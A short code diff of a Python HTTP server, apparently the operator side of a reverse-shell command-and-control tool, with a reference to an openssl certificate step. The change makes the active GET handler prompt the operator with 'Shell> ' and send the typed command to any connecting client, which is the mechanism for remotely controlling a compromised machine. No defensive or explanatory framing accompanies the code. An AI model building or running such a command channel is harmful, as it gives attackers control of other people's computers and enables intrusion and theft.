@@ -63,7 +63,7 @@ Step 4: openssl pkcs12 -in certificate.p12 -noout -info
 
 class MyHandler(http.server.BaseHTTPRequestHandler):
 
-    def do_GET_old(self):
+    def do_GET(self):
         dir(self)
         command = input("Shell> ")
         self.send_response(200)
@@ -71,7 +71,7 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(command.encode())
 
-    def do_GET(self):
+    def do_GET_old(self):
         global count
         dir(self)
         self.send_response(200)
